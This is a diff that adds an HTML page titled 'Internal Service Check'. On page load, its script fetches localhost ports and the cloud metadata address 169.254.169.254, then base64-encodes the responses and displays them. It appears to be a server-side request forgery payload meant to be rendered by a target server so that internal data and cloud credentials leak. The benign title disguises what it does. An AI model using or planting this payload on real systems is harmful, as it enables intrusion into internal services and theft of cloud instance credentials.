@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Internal Service Check</title>
+</head>
+<body>
+    <h2>Checking internal services...</h2>
+    <div id="result">Loading...</div>
+
+    <script>
+        // Array de objetivos a probar
+        const targets = [
+            'http://127.0.0.1:8080',
+            'http://localhost:8080',
+            'http://127.0.0.1:80',
+            'http://169.254.169.254/latest/meta-data/'
+        ];
+
+        async function testTargets() {
+            let results = '';
+            
+            for (const target of targets) {
+                try {
+                    const response = await fetch(target);
+                    const text = await response.text();
+                    const base64 = btoa(unescape(encodeURIComponent(text)));
+                    results += `SUCCESS: ${target}\nBASE64: ${base64}\n\n`;
+                } catch (error) {
+                    const errorBase64 = btoa(unescape(encodeURIComponent(`Error: ${error.message}`)));
+                    results += `ERROR: ${target}\nBASE64: ${errorBase64}\n\n`;
+                }
+            }
+            
+            document.getElementById('result').innerHTML = 
+                '<textarea style="width:100%;height:300px;font-family:monospace">' + 
+                results + '</textarea>';
+        }
+
+        testTargets();
+    </script>
+</body>
+</html>
